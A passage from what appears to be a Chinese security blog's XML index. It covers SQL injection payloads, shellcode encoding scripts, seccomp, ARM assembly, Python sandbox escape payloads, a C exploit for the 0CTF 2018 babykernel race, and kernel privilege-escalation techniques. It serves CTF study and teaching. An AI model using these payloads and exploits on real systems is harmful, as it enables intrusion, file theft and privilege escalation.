BY子句中可以用字段的列序号(从1开始)代替字段名. 发现注入漏洞后,可以使用ORDER BY n的回显判断出结果集的列数,这个时候可以使用类似and 1=2 union select 1,2,...,n来判断回显的具体是哪些列. 堆叠式注入通过;分割语句,通常用于更新/修改数据. floor报错注入floor报错注入准确地说应该是floor,count,group by冲突报错. floor(x)返回不大于x的最大整数值.rand()返回一个0-1之间的随机数.rand()在ORDER BY和GROUP BY子句中会被执行多次. 1select count(*), (floor(rand(0) * 2)) as x from information_schema.tables group by x count(*)与group by在一起时的工作机制. 建立一个虚拟表,两列:key和count(*). 查询数据,在虚拟表中寻找是否已经存在数据(key),存在则对应行的count(*)加一,不存在则插入数据并设置count(*)为一. 对查询字段循环第二步. 由于floor(rand(0) * 2)会产生两个伪随机的值,且值序列开头为011011.对应的虚拟表建立过程就是. 查询到0,查虚拟表发现无,插入key = 1. 查询到1,查虚拟表发现有,1对应count(*)加一变成2. 查询到0,查虚拟表发现无,插入key = 1失败(key为主键)报错. 可以通过以下payload获取想要的信息. 1select count(), concat((select database()), '-', floor(rand(0)2)) as a from information_schema.tables group by a; Oracle注入Oracle是甲骨文公司的一款关系数据库管理系统. Oracle有数据字典和数据字典视图.数据字典是元数据的集合,从逻辑上和物理上描述了数据库及内容,存储于SYSTEM与SYSAUX表空间内的若干段数据字典视图:分为三类:USER,ALL,DBA.以前辍来区分,不同类拥有不同的权限.USER:用户所拥有的对象信息;ALL:用户能访问的对象信息;DBA:整个数据库中的对象信息.例如:user_tables表中存储用户拥有的表的信息,user_tab_columns表中存储用户拥有的列的信息. Dual是Oracle中的一个实际存在的表,任何用户均可读取,常用在没有目标表的select语句块中查看当前连接用户. 联合查询注入与MySQL操作类似.注意:Oracle会自动将小写转换为大写. SQL Server注入SQL Server是Microsoft公司推出的关系型数据库管理系统. SQL Server 2005引入了一组目录视图作为保留系统元数据的通用接口.所有目录视图(包括动态管理对象和兼容性视图)都在sys模式中,访问对象时必须引入模式名称. sys.databases:存放数据库相关的信息.安装SQL Server时,sys.databases包含master,model,msdb,mssqlweb和tempdb数据库的项.该表存储在master数据库中.sys.objects:存放数据库创建的所有对象.如约束,默认值,日志,规则,存储过程等,每个对象在表中占一行.Name,id,xtype,uid,status分别是对象名,对象ID,对象类型,所有者对象的用户ID,对象状态.sys.columns:每个表和视图中的每列在该表中占一行,存储过程中的每个参数在该表中也占一行.name,id,colid分别是字段名称,表ID号,字段ID号. 报错注入利用关系运算符的类型转化:(select top 1 name from sys.databases) &gt; 0,db_name() &gt; 0.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-shellcode编写]]></title>
    <url>%2Fposts%2F6d02208d%2F</url>
    <content type="text"><![CDATA[字符检测绕过有时候程序会对输入进行一些可打印检查,导致平常的shellcode失效,这个时候需要对shellcode进行编码. 可打印检查一般分为Alphanumeric(字符在[A-Za-z0-9]区间)和Printable(字符的ascii码在0x1f和0x7f区间,不包含边界). Printable x86x86下可以使用msf内置的encoder. 1234567msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax#可以直接生成shellcode,BufferRegister是指向shellcode的寄存器.#如果不声明BufferRegister,生成的shellcode会有额外的几条并不是可打印字符的指令来确定shellcode的位置.#x86/alpha_mixed这个encoder也可.x86/unicode_mixed与x86/unicode_upper用于宽字节的情况.cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax#也可以用msf来编码已有的shellcode Printable x86-64目前手动编比较靠谱. 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.arch = "amd64"context.log_level = "debug"r = process("./chall3")gdb.attach(r)payload = ''' push rax pop rdi push r15 pop rsi push r15 push r15 push r15 push r15 pop rsi pop rsi pop rsi pop rsi push 0x60 pop rdx sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2b], dl sub byte ptr [rax + 0x2d], dl sub byte ptr [rax + 0x2e], dl push r15 pop rdx push 0x3b pop rax'''#r15 = 0#rax = &amp;shellcodepayload = asm(payload)print hex(len(payload))payload += "\x48\x43\x27\x2f\x6f\x65/bin/sh"r.send(payload)r.interactive() 一个不太靠谱的工具:https://github.com/ecx86/shellcode_encoder. UnPrintable x86123456789101112131415161718192021222324252627282930from pwn import *context.arch = "i386"context.log_level = "debug"r = process("./pwn")gdb.attach(r, "b * 0x80485F0\nc")payload = ''' mov edx, 0xff mov edx, 0xff mov edx, 0xff mov edx, 0xff mov edx, 0xff mov ecx, 0x804A08a mov ebx, 0 mov eax, 3 int 0x80'''#rax = &amp;shellcodepayload = asm(payload)print hex(len(payload))payload = payload.ljust(0x100, "\x00")r.send(payload)payload = asm(shellcraft.sh())r.send(payload)r.interactive()]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-沙箱机制]]></title>
    <url>%2Fposts%2F4b758b7f%2F</url>
    <content type="text"><![CDATA[沙箱机制沙箱(Sandbox)是一种程序的隔离运行机制,其目的是限制不可信进程或不可信代码运行时的访问权限. seccomp是一种内核中的安全机制,通过seccomp可以在程序中禁用掉某些syscall.seccomp规则的设置可以使用prtcl函数和seccomp函数族. prctl函数12#include &lt;sys/prctl.h&gt;extern int prctl (int __option, ...) __THROW; prctl函数功能主要看option参数,其中与seccomp机制相关的有:PR_SET_NO_NEW_PRIVS(38),PR_SET_SECCOMP(22).其中prctl(38, 1, 0, 0, 0);表示禁用系统调用. prctl(22, arg2, arg3)根据arg2有两种情况. arg2 == 1(SECCOMP_MODE_STRICT)表示允许的系统调用为read,write,exit(非exit_group)和sigreturn. arg2 == 2(SECCOMP_MODE_FILTER)表示允许的系统调用由arg3指向sock_fprog结构体定义,该结构体的成员指向的sock_filter结构体可以定义过滤任意系统调用和系统调用参数. 1234567891011struct sock_filter &#123; /* Filter block */ __u16 code; /* Actual filter code */ __u8 jt; /* Jump true */ __u8 jf; /* Jump false */ __u32 k; /* Generic multiuse field */&#125;;struct sock_fprog &#123; /* Required for SO_ATTACH_FILTER. */ unsigned short len; /* Number of filter blocks */ struct sock_filter __user *filter;&#125;; 如果可以覆盖sock_filter结构体就可以控制沙箱规则. seccomp-toolssock_filter结构体内容的编写可以通过seccomp-tools完成. seccomp-tools常用命令. 1234#查看程序seccomp规则,需要运行程序到规则生效.seccomp-tools dump ./pwn#将自定义的规则转成结构体形式.seccomp-tools asm myRule.asm -f raw | seccomp-tools disasm - 沙箱规则编写示例. 123456789#myRule.asmA = archA = sys_numberA = args[0]A == 666 ? dead : nextallow:return ALLOWdead:return ERRNO(0) seccomp函数族编译选项:-lseccomp,需要安装对应依赖库. 1234scmp_filter_ctx ctx;ctx = seccomp_init(SCMP_ACT_ALLOW);seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);seccomp_load(ctx); typedef void *scmp_filter_ctx;,实际上ctx就是个指针. seccomp_init根据参数返回一个指向规则结构体的指针. 1234#define SCMP_ACT_ALLOW 0x7fff0000U//表示默认允许所有的syscacll#define SCMP_ACT_KILL 0x00000000U//表示默认禁止所有的syscall seccomp_rule_add根据参数添加规则.第二个参数SCMP_ACT_KILL表示禁止,SCMP_ACT_ALLOW表示允许.第三个参数指定规则针对的系统调用号.第四个参数表示是否限制参数. 如:seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 1, SCMP_A2(SCMP_CMP_EQ, 0));表示禁止第三个参数为0的execve调用. seccomp_load根据参数应用规则.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-ARM-基础]]></title>
    <url>%2Fposts%2F43205f19%2F</url>
    <content type="text"><![CDATA[ARM简介ARM是一个RISC处理器,拥有一套精简的指令集以及比CISC处理器更多的通用寄存器.与Intel处理器不同,ARM指令只处理寄存器中的数据,只有load/store指令可以读/写存储器.这种架构的优势是指令可以被更快的执行,同时RISC处理器通过引入流水线机制,减少每个指令的占用的CPU的时钟周期来缩短执行时间. ARM官方信息中心:ARM Information Center. 工作状态ARM处理器有两种工作状态(并非运行模式)ARM和Thumb.两种工作状态之间最大的差异是指令集,ARM状态的指令长度为32位且字对齐,Thumb状态的指令长度一般为16位且半字对齐,也可能为32位. ARM中的字为四字节,半字为两字节. 编写ARM的shellcode时,使用Thumb指令代替ARM指令可以避免在指令中出现\0截断. Thumb不同的ARM版本,支持的Thumb指令集并不相同. Thumb-1(16位指令):用于ARMv6和更早的版本. Thumb-2(16位和32位指令):对Thumb-1的扩展,添加了更多指令并允许它们为16位或32位宽,用于ARMv6T2,ARMv7. ThumbEE:在Thumb-2基础上包含了针对动态代码生成(代码在执行前或执行期间编译代码)的一些变更和补充,用于之后的版本. 不同的命名只是为了区分不同的版本.处理器只知道它运行在Thumb工作状态. ARM这里主要列举ARM和Thumb的区别. ARM工作状态下的所有指令都支持条件执行,而Thumb只有某些ARM处理器版本允许使用IT指令进行条件执行. 32位ARM和Thumb指令的区别为32位Thumb指令具有.w后缀. ARM工作状态下有一个特有的功能:桶形移位器,支持数据的各种移位操作,移位操作在ARM指令集中只能作为指令格式中的一个字段.例如:MOV R0, R1, LSL#2. 运行模式ARM处理器支持7种运行模式. usr(用户模式):ARM处理器正常程序执行模式. fiq(快速中断模式):用于高速数据传输或通道处理. irq(外部中断模式):用于通用的中断处理. svc(管理模式):操作系统使用的保护模式. abt(数据访问终止模式):当数据或指令预取终止时进入该模式,可用于虚拟存储及存储保护. sys(系统模式):运行具有特权的操作系统任务. und(未定义指令中止模式):当执行未定义的指令时进入该模式,可用于支持硬件协处理器的软件仿真. ARM处理器的运行模式可以通过软件改变,也可以通过外部中断或异常处理改变. 大多数的应用程序运行在用户模式下,当处理器运行在用户模式下时,某些被保护的系统资源是不能被访问的. 除用户模式以外的所有6种模式称之为非用户模式,或特权模式(Privileged Modes);除用户模式和系统模式以外的5种又称为异常模式(Exception Modes),常用于处理中断或异常,以及需要访问受保护的系统资源等情况. ARM处理器在每一种处理器模式下均有一组相应的寄存器与之对应.即在任意一种处理器模式下,可访问的寄存器包括15个通用寄存器(R0~R14),一至二个状态寄存器和程序计数器.在所有的寄存器中,有些是在7种处理器模式下共用的同一个物理寄存器,而有些寄存器则是在不同的处理器模式下有不同的物理寄存器. ARM寄存器ARM微处理器共有37个32位寄存器,其中31个为通用寄存器,6个为状态寄存器.这些寄存器不是随时都能访问的,取决于此时ARM处理器的工作状态及具体的运行模式.任何时候通用寄存器R0 ~ R14,程序计数器PC(R15)和CPSR状态寄存器都是可访问的. 通用寄存器:R0~R15,R13_svc,R14_svc,R13_abt,R14_abt,R13_und,R14_und,R13_irq,R14_irq,R8_fiq~R14_fiq.通用寄存器(R0~R15)可分成不分组寄存器R0~R7,分组寄存器R8~R14和程序计数器R15. 不分组寄存器是真正的通用寄存器,在所有处理器模式下访问的都是同一个物理寄存器.分组寄存器取决于当前的处理器模式,每种模式有专用的分组寄存器用于快速异常处理. 寄存器R13通常用做堆栈指针SP;寄存器R14用作子程序链接寄存器,也称为LR,指向函数的返回地址;寄存器R15被用作程序计数器(PC),其值等于当前正在执行的指令的地址加8. 状态寄存器:CPSR,SPSR_svc,SPSR_abt,SPSR_und,SPSR_irq,SPSR_fiq. CPSR包含条件码标志,中断禁止位,当前处理器模式以及其它状态和控制信息.CPSR在每种异常模式下都有一个对应的程序状态保存寄存器SPSR.当异常出现时,SPSR用于保存CPSR的值,以便异常返回后恢复工作状态. ARM指令集ARM在不同工作状态下有不同的指令集,但助记符不变. 数据处理指令数据处理指令可分为数据传送指令,算术逻辑运算指令和比较指令等. 指令标识符中的S决定指令的操作是否影响CPSR中条件标志位的值,没有S时指令不更新CPSR中的条件标志位. 1234567891011121314151617181920212223242526272829303132333435363738394041;数据传送指令传送数据并可以更新CPSR中的相应条件标志位.MOV&lt;condition&gt;&lt;S&gt; DEST, OP1;DEST=OP1,DEST是寄存器,OP1可以是寄存器,被移位的寄存器,或立即数.;DEST为R15时将修改程序计数器或标志.MOV PC, R14 =&gt; 退出到调用者;MOVS PC, R14 =&gt; 退出到调用者并恢复标志位.MVN&lt;condition&gt;&lt;S&gt; DEST, OP1;DEST=~OP1,DEST是寄存器,OP1可以是寄存器,被移位的寄存器,或立即数.;算术逻辑运算指令保存运算结果并可以更新CPSR中的相应条件标志位.ADD&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.ADC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2+CPSR.C,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.SUB&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1-OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.SBC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2-~CPSR.C,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.RSB&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP2-OP1,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.RSC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP2-OP1-~CPSR,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.AND&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1&amp;OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.ORR&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1|OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.EOR&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1^OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.BIC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1&amp;(~OP2),DEST是寄存器,OP1是寄存器,OP2是32位掩码.;BIC R0, R0, #%1011;清除R0中的位0,1,和3,其余的位保持不变.;比较指令不保存运算结果,只更新CPSR中相应的条件标志位.CMP&lt;condition&gt; OP1, OP2;同SUB,不存储结果,只更改条件标志位.CMN&lt;condition&gt; OP1, OP2;同SUB,但OP2改为~OP2,不存储结果,只更改条件标志位.TST&lt;condition&gt; OP1, OP2;同AND,不存储结果,只更改条件标志位.TEQ&lt;condition&gt; OP1, OP2;同EOR,不存储结果,只更改条件标志位. 加载/存储指令12345678LDR&lt;condition&gt;(B/H) Rd, ADDR;用于从存储器中将一个32(8/16)位的字数据传送到目的寄存器中.STR&lt;condition&gt;(B/H) Rd, ADDR;用于从源寄存器中将一个32(8/16)位的字数据传送到存储器中.;批量数据加载/存储指令指令LDM/STM&lt;condition&gt;&lt;type&gt; Rd!, &#123;Rd2, ...&#125;;type:IA,每次传送后地址加1;IB,每次传送前地址加1;DA,每次传送后地址减1;DB,每次传送前地址减1;FD,满递减堆栈;ED,空递减堆栈;FA,满递增堆栈;EA,空递增堆栈; 移位指令ARM处理器设置与数据处理指令一起使用的桶式移位器(barrel shifter),也可以使用桶式移位器影响LDR/STR操作中的变址值. 移位操作在ARM指令集中不作为单独的指令使用,如果数据处理指令的第二个操作数或者单一数据传送指令中的变址是寄存器,则可以对它进行各种移位操作. LSL,逻辑左移;ASL,算术左移;LSR,逻辑右移;ASR,算术右移;ROR,循环右移;RRX,带扩展的循环右移.可以用一个立即值(0 ~ 31)指定移位数量,或用包含0 ~ 31值的寄存器指定移位数量. 指令标识符中的S决定指令的移出位是否设为进位标志的值,有则设置,否则移出位抛弃. 1234567891011121314Rn, LSL #n;Rn=Rn&lt;&lt;n.最低有效位用零来填充.Rn, ASL #n;同上.Rn, LSL Rx;Rn=Rn&lt;&lt;Rx.最低有效位用零来填充.Rn, ASL Rx;同上.Rn, LSR #n;Rn=Rn&gt;&gt;n.最高有效位用零来填充.Rn, LSR Rx;Rn=Rn&gt;&gt;Rx.最高有效位用零来填充.Rn, ASR #n;Rn=Rn&gt;&gt;n.最高有效位用第31位的值来填充.Rn, ASR Rx;Rn=Rn&gt;&gt;Rx.最高有效位用第31位的值来填充.Rn, ROR #n;循环右移类似于逻辑右移,但是最高有效位用移出位填充.Rn, ROR Rx;同上,移位量为32的操作将导致输出与输入完全一致.Rx, RRX;Rx的位向右移动一个位置,移动时会使用处理器的进位标志来提供一个要被移位的数量,也就是参与移位的有33个位. 乘法指令1234MUL&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1*OP2.DEST为R15之外的简单寄存器,DEST和OP1必须是不同的寄存器,所有OP必须为简单寄存器.MLA&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2, OP3;DEST=(OP1*OP2)+OP3.DEST为R15之外的简单寄存器,DEST和OP1必须是不同的寄存器,所有OP必须为简单寄存器. 跳转指令跳转指令用于实现程序流程的跳转.addr的值由寄存器R0~R15提供. 存储在跳转指令中的实际值是相对当前R15(PC)的一个偏移量(24位有符号数),左移两位后有符号扩展为32位,表示的有效偏移为26位(+/-32M). 12345678B&lt;condition&gt; ADDR;R15=R15+ADDR.BL&lt;condition&gt; ADDR;MOV R14, R15;R15=R15+ADDR.BLX addr;ARM工作状态使用,跳转到指令中所指定的目标地址,并切换到Thumb工作状态,该指令同时将PC的当前内容保存到寄存器R14中.BX&lt;condition&gt; addr;跳转到指令中所指定的目标地址,状态切换是由addr的最低位来指定的,如果等于0,进入ARM工作状态,如果为1,则进入Thumb工作状态. ARM中还有一种实现程序流程的跳转,直接向程序计数器PC写入跳转地址值,跳转之前保存返回地址从而实现子程序调用. 状态寄存器访问指令123456MRS&lt;condition&gt; Rd, CPSR/SPSR;用于将程序状态寄存器的内容传送到通用寄存器中.MSR&lt;condition&gt; CPSR/SPSR(_f/s/x/c), Rd/num;用于将操作数的内容传送到程序状态寄存器的特定域/整个.;32位的程序状态寄存器可分为4个域:位[31:24]为条件标志位域,用f表示;位[23:16]为状态位域,用s表示;位[15:8]为扩展位域,用x表示;位[7:0]为控制位域,用c表示; 异常产生指令12345SWI&lt;condition&gt; num;24bit num;用于产生软件中断,访问操作系统例程或第三方生产的模块,num表示SWI编号.相关参数通过通用寄存器传递.当指令中24位的立即数被忽略时,SWI编号由通用寄存器R0的内容决定.BKPT num;16bit num;ARMv5T之后加入的中断指令,用于产生软件断点中断,可用于程序的调试. ARM通过SWI让程序陷入内核进行系统调用.SWI指令用于产生软件中断,从而切换到管理模式,CPSR保存到管理模式的SPSR,跳转到SWI向量.在其他模式下也可使用SWI指令切换到管理模式. 调用号:https://elixir.bootlin.com/linux/v2.6.32/source/arch/arm/include/asm/unistd.h. 异常处理函数(SWI向量)使用下面指令获取24位调用号:LDR R0, [LR, #-4]; BIC R0, R0, #0xFF000000.通过对SPSR访问确定软中断的SWI指令是ARM指令还是Thumb指令. 条件代码ARM对所有指令提供了条件执行,条件代码如下. EQ:等于,如果设置了Z标志. NE:不等于,如果清除了Z标志. VS:溢出,如果设置了V标志. VC:未溢出,如果清除了V标志. HI:高于(无符号),如果设置了C标志并清除了Z标志. LS:低于或等于(无符号),如果清除了C标志或设置了Z标志. PL:非负数,如果清除了N标志. MI:负数,如果设置了N标志. CS:进位,如果设置了C标志. CC:未进位,如果清除了C标志. GE:大于或等于(有符号),如果设置了N标志并设置了V标志,或者清除了N标志并清除了V标志. GT:大于(有符号),满足GE的同时清除了Z标志. LE:小于或等于(有符号),如果设置了N标志并清除了V标志,或者清除了N标志并设置了V标志.满足前面的同时设置了Z标志. LT:小于(有符号),如果设置了N标志并清除了V标志,或者清除了N标志并设置了V标志. AL:总是. NV:从不. 伪代码AREA伪指令用于定义一个代码段或数据段:AREA 段名 属性1, 属性2, …;段名若以数字开头,则该段名需用|括起来,如|1_test|. 常用的属性:CODE,用于定义代码段,默认为READONLY;DATA,用于定义数据段,默认为READWRITE;READONLY,指定本段为只读;READWRITE,指定本段为可读可写;ALIGN=n,以2^n对齐,默认是按字对齐的; CODE16/CODE32.CODE16伪指令通知编译器,其后的指令序列为16位的Thumb指令;CODE32伪指令通知编译器,其后的指令序列为32位的ARM指令. ENTRY伪指令用于指定汇编程序的入口点.END伪指令用于通知编译器已经到了源程序的结尾. 函数调用ARM和AArch64使用的是ATPCS(ARM-Thumb Procedure Call Standard)的函数调用约定. ARM的函数调用约定:函数的前4个参数分别保存在r0 ~ r3寄存器中,剩下的参数从右向左依次入栈,被调用者实现栈平衡,返回值保存在r0中. AArch64的函数调用约定:函数的前8个参数分别保存在x0 ~ x7寄存器中,剩下的参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在x0中.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-escape-pwn-python沙箱逃逸]]></title>
    <url>%2Fposts%2Fca893f4c%2F</url>
    <content type="text"><![CDATA[0x00python沙箱,即加上了部分限制的python终端.而沙箱逃逸就是绕过python沙箱实现命令执行. 模块导入python导入模块的方法通常有三种. 12345import pwnfrom pwn import *__import__('pwn').p64(1111)#注意,该方法不能永久导入 导入的模块a中的另一个模块b则可以用a.b的方法或者a.__dict__[&quot;b&quot;]的方法间接访问模块b. 1__import__('pwn').__dict__["elf"] 命令执行python的内建函数中,有一些函数可以实现任意命令执行. 1234567891011os.system('/bin/sh')commands.getstatusoutput('cat flag')#执行shell命令,返回执行的标准输出和标准错误.commands.getoutput('cat flag')#执行shell命令,返回执行的输出.subprocess.call('/bin/sh', shell = True)subprocess.Popen('cat flag', shell = True)pty.spawn('/bin/sh')os.popen('/etc/passwd')execfile('/usr/lib/python2.7/os.py')#文件执行timeit.timeit("__import__('os').system('dir')", number = 1)eval('__import__("os").system("dir")')print platform.popen('dir').read() 内置函数dir()在没有参数的时候返回本地作用域中的名称列表,有参数的时候返回参数对象的有效属性列表. 当不能导入模块或者模块被禁,此时就需要使用python内置函数(即默认已经导入的函数),对应的内置模块__builtins__.可以通过dir(__builtins__)获取内置函数列表.可以通过dict引入模块,dict的作用是列出一个模组/类/对象下所有的属性和函数. 而一个模块对象有一个由字典对象实现的命名空间,属性的引用会被转换为这个字典中的查找,例如:m.x等同于m.dict[&quot;x&quot;]. 12__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#__import__('os') 如果一些内置函数在__builtins__删除,可以通过reload(__builtins__)重新载入.python3可以导入builtins模块. 12import builtinsdir(builtins) object类基础函数python的object类中集成了很多的基础函数,可以通过创建对象来引用.通过__class__.__mro__方法可打印出其继承关系,通过__class__.__bases__方法可以获取上一层继承关系. 常见的寻找特殊模块的方法:__class__,获得当前对象的类;__bases__,列出其基类;__mro__,列出解析方法的调用顺序;__subclasses__(),返回子类列表;__dict__,列出当前属性/函数的字典;func_globals,返回一个包含函数全局变量的字典引用. 比如().__class__.__bases__[0].__subclasses__()[40]对应的是file类.常见payload. 123456#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\flag').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/tmp/hhh', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat flag").read()') 间接引用python中原生的import是存在被引用的,只要找到相关对象引用就可以避开沙箱的限制. 1print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('c'+'at flag') f修饰符在PEP 498(python &gt; 3.6.0)中引入了新的字符串类型修饰符:f或F,用f修饰的字符串将可以执行代码.可以理解为字符串外层套了一个exec(). 123&gt;&gt;&gt; f'&#123;print("shaobaobaoer")&#125;'shaobaobaoer'None' 修改got表实际上就是写/proc/self/mem内存镜像,通过覆写got表达到getshell的目的. 12(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at flag'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))#0x08de2b8是system@got的偏移,0x08de8c8是fopen@got的偏移. 一些绕过思路 .可替换为getattr(),例如:getattr(pwn, &quot;p64&quot;)(1111).]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>escape-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-0ctf-2018-finals-babykernel]]></title>
    <url>%2Fposts%2F6d245606%2F</url>
    <content type="text"><![CDATA[分析当ioctl中cmd参数为0x6666时,驱动将输出flag的加载地址. 当ioctl中cmd参数为0x1337时,首先进行三个校验,接着对用户输入的内容与硬编码的flag进行逐字节比较,一致则将flag输出. 三个校验为:输入的数据指针是否为用户态数据;数据指针内flag_str是否指向用户态;数据指针内flag_len是否等于硬编码flag的长度. 当用户输入数据通过验证后,再将flag_str所指向的地址改为flag硬编码地址后,就会输出flag. 环境问题此题在环境配置时,有几点需要注意. 在启动脚本中加入echo 0 &gt; /proc/sys/kernel/dmesg_restrict关闭dmesg_restrict,否则无法查看printk信息. 配置QEMU启动参数时,不要开启SMAP保护,否则在内核中直接访问用户态数据会引起kernel panic. 配置QEMU启动参数时,不能配置为非单核单线程启动,否则无法触发竞争条件.具体操作是在启动参数中增加其内核数选项:cores=2,threads=1. 利用思路首先0x6666获取内核中flag的加载地址,通过dmesg命令查看. 然后构造符合0x1337功能的数据结构,其中flag_len可以从硬编码中直接获取为33,flag_str指向一个用户空间地址. 最后,创建一个线程不断修改flag_str为flag的内核地址以制造竞争条件,输出flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#define TRYTIME 0x1000struct ttt &#123; char * ptr; size_t len;&#125;;char * flag_addr;int finish = 0;char buf[100];void change_flag_str(struct ttt * check)&#123; while(!finish)&#123; check-&gt;ptr = flag_addr; &#125;&#125;int main(void)&#123; char *idx; int fd; pthread_t t; struct ttt check; setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); fd = open("/dev/baby", 0); ioctl(fd, 0x6666); system("dmesg"); scanf("%llu", &amp;flag_addr); printf("flag_addr: %p\n", flag_addr); check.len = 33; check.ptr = buf; pthread_create(&amp;t, NULL, change_flag_str, &amp;check); for(int i = 0;i &lt; TRYTIME;i++) &#123; ioctl(fd, 0x1337, &amp;check); check.ptr = buf; &#125; finish = 1; pthread_join(t, NULL); close(fd); system("dmesg | grep flag"); return 0;&#125; 12gcc -static exp.c -lpthread -o exp#-lpthread用于链接多线程动态库 非预期解法此题存在一种侧信道攻击的非预期解法.由于是flag是硬编码且检查方法是逐字节比较,因此可以逐字节爆破来得到flag. 方法是将待爆破的字节放在mmap申请的内存页末位,此时下一字节位于不可读写的用户态空间.当得到正确的一字节时,内核会比较用户空间内下一个字节的正确性,由于该地址是不可读的,将导致kernel panic,从而可以判断是否爆破的一个字节正确.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-kernel-pwn-常见漏洞利用]]></title>
    <url>%2Fposts%2Fee4799c7%2F</url>
    <content type="text"><![CDATA[ROP12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态getshell(如果开了SMEP),也就是要通过ROP模拟内核态退出到用户态的流程. 12345678910111213141516171819202122232425unsigned long user_cs, user_ss, user_eflags, user_sp;void save_stats()&#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;// 栈排布.// &amp;set_uid// swapgs_pop_ebp_ret// rbp(padding)// iret_addr// &amp;getshell// user_cs// user_rflags// user_rsp// user_ss ret2usrret2usr攻击利用用户空间的进程不能访问内核空间,但内核空间能访问用户空间的特性来定向内核代码或数据流指向用户空间,以Ring 0特权执行用户空间代码完成提权等操作. 可以直接ROP劫持控制流返回到用户空间代码提权.也可以利用tty_struct结构体的ops函数表劫持控制流,因为rax中存储着伪造的函数表指针,通过mov rsp, rax,xchg rsp, rax这种ROPgadget即可将栈转换到用户态来构造ROP. ret2dirlinux内核在设计的时候,为了提高内存的操作效率,在用户空间映射内存的时候,内核也相应地在内核的低端内存区地址映射一段影子内存. 攻击者可以将用户空间的攻击代码映射到内核的低端内存可执行区或者将特定数据进行喷射到内核的低端内存,进行内存布局,然后利用漏洞让内核执行攻击代码,从而达到提权的目的,这项技术在32位arm设备上有60%以上的成功率,而在64位arm中有96%的成功率. 2016年7月google在android PIXEL(内核3.18-16.04)版本以后封杀了ret2dir的攻击方式. 不过现在又出现了vDSO重写这种利用方式. 